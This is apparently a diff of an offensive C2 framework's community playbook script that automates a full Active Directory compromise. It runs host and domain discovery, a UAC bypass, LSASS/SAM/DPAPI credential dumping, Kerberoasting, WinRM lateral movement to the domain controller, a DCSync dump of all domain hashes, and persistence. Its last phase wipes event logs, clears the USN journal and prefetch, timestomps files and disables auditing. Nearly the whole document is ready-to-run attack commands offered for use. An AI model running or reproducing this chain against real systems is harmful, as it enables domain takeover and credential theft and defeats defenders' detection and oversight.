@@ -1,62 +1,94 @@
 # ===========================================================================
-# Megaploit Community Playbook — Full Active Directory Compromise Chain
+# Megaploit Community Playbook
 # ===========================================================================
-# Objective : Initial foothold → Domain Admin via Kerberoast + DCSync
+# Name        : ad-full-compromise
+# Version     : 1.1
+# Author      : megaploit-community
+# Tested on   : Windows 10 21H2, Windows Server 2019, Server 2022
+# Description : Full Active Directory compromise chain — unprivileged domain
+#               user foothold to Domain Admin via Kerberoasting and DCSync.
 #
-# Variables (set before running):
-#   ${LHOST}   — your C2 listener IP
-#   ${LPORT}   — your C2 listener port
-#   ${DOMAIN}  — target domain  (e.g. corp.local)
-#   ${DC}      — domain controller hostname or IP
-#   ${SESSION} — session ID of the initial foothold (set after beacon lands)
+# MITRE ATT&CK
+# ------------
+# T1033   System Owner/User Discovery
+# T1082   System Information Discovery
+# T1016   System Network Configuration Discovery
+# T1087.002 Account Discovery: Domain Account
+# T1548.002 Abuse Elevation Control Mechanism: Bypass UAC (sdclt)
+# T1003.001 OS Credential Dumping: LSASS Memory
+# T1003.002 OS Credential Dumping: SAM
+# T1003.006 OS Credential Dumping: DCSync
+# T1558.003 Steal or Forge Kerberos Tickets: Kerberoasting
+# T1550.002 Use Alternate Authentication Material: Pass the Hash
+# T1021.006 Remote Services: Windows Remote Management
+# T1053.005 Scheduled Task/Job: Scheduled Task
+# T1546.003 Event Triggered Execution: Windows Management Instrumentation
+# T1070.001 Indicator Removal: Clear Windows Event Logs
+# T1070.004 Indicator Removal: File Deletion
+# T1099   Timestomp
 #
-# Usage:
-#   resource playbooks/ad_full_compromise.rc
+# Variables
+# ---------
+#   ${SESSION}  — session ID of the initial foothold beacon
+#   ${LHOST}    — your C2 listener IP
+#   ${DOMAIN}   — target domain FQDN  (e.g. corp.local)
+#   ${DC}       — domain controller IP or hostname
 #
-# Prerequisites:
-#   - A listener is already running on ${LHOST}:${LPORT}
-#   - You have an initial unprivileged session
+# Usage
+# -----
+#   community install playbook ad-full-compromise
+#   resource community/playbooks/ad-full-compromise.rc
+#
+# Phases
+# ------
+#   0  Listener (skip if already running)
+#   1  Situational awareness
+#   2  Local privilege escalation
+#   3  Credential harvest
+#   4  Kerberoasting
+#   5  Lateral movement to DC
+#   6  DCSync — full domain dump
+#   7  Persistence
+#   8  Evidence suppression
 # ===========================================================================
 
 # ── Phase 0: Listener (skip if already configured) ─────────────────────────
-# listener add http ${LHOST} ${LPORT}
+# listener add https ${LHOST} 443
 
 # ── Phase 1: Situational Awareness ─────────────────────────────────────────
 session ${SESSION}
 shell whoami /all
 shell hostname
+shell systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Domain"
 shell ipconfig /all
 shell net user /domain
 shell net group "Domain Admins" /domain
 shell net group "Domain Controllers" /domain
+shell net group "Enterprise Admins" /domain
 
 # ── Phase 2: Local Privilege Escalation ────────────────────────────────────
-# Try common UAC bypasses first
 post/windows/privesc/uac_sdclt
-# If that fails, check for unquoted service paths / weak ACLs
-shell wmic service get name,pathname,startmode | findstr /i "auto" | findstr /v "c:\windows\\"
+# Fallback — check weak service paths
+shell wmic service get name,pathname,startmode | findstr /i "auto" | findstr /v "C:\\Windows\\"
 
 # ── Phase 3: Credential Harvest ────────────────────────────────────────────
-# Dump LSASS in-memory
 kiwi logonpasswords
-# SAM + SYSTEM hive dump
 kiwi sam
-# DPAPI master keys
+kiwi lsa
 kiwi dpapi
+kiwi credman
 
 # ── Phase 4: Kerberoasting ──────────────────────────────────────────────────
-# Enumerate SPNs and request TGS tickets
-shell setspn -Q */* -T ${DOMAIN}
+shell setspn -Q */* -T ${DOMAIN} 2>nul
 kiwi tickets
 
 # ── Phase 5: Lateral Movement to Domain Controller ─────────────────────────
-# Pass-the-hash or pass-the-ticket to DC
 lateral_winrm ${DC} administrator
-# After new session lands:
-# session <new_session_id>
+# After the new session lands, switch to it and verify access:
+# session <new_id>
 # shell net localgroup administrators
 
-# ── Phase 6: DCSync — dump all domain hashes ───────────────────────────────
+# ── Phase 6: DCSync ─────────────────────────────────────────────────────────
 kiwi dcsync ${DOMAIN}
 kiwi lsa
 
@@ -67,9 +99,11 @@ post/windows/privesc/wmi_persist
 # ── Phase 8: Evidence Suppression ──────────────────────────────────────────
 log_wipe Security
 log_wipe System
+log_wipe Application
 usnjrnl_wipe
 prefetch_clear
 timestomp C:\Windows\System32\cmd.exe ${DATE}
+audit_disable ProcessCreation
 
 # ── Done ────────────────────────────────────────────────────────────────────
 sessions
